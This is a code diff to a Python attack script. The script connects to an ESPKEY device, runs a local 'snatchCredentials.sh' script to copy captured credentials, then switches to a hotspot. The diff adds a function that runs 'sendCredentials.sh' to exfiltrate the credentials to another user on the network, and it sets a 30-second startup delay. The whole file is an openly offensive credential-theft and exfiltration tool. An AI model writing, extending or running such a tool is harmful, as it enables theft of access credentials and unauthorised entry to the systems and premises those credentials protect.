@@ -19,7 +19,11 @@ def connectEspKey():
     print("Connection Established")
 
 def credentialsLocalFile():
-    filename = "snatchcredentials.sh"
+    filename = "snatchCredentials.sh"
+    subprocess.run(["bash", filename])
+
+def exfiltrateLocalFile():
+    filename = "sendCredentials.sh"
     subprocess.run(["bash", filename])
 
 def connectInternet():
@@ -36,13 +40,15 @@ def connectInternet():
     print("Connection Established")   
 
 def main():
-    time.sleep(0)# increase to around 30 to allow computer to start up
+    time.sleep(30)# 30 seconds to allow computer time to start up
     print("STARTING INITIAL CONNECTION")
     connectEspKey() # connect to ESPKEY
     print("SAVING CREDENTIALS LOCALLY")
     credentialsLocalFile() # make a local copy of credentials
     print("STARTING SECOND CONNECTION")
     connectInternet() # connect to hotspot to exfiltrate local file
+    print("EXFILTRATING CREDENTIALS")
+    exfiltrateLocalFile() # exfiltrates file to another user on network
 
 if __name__=="__main__":
     main()
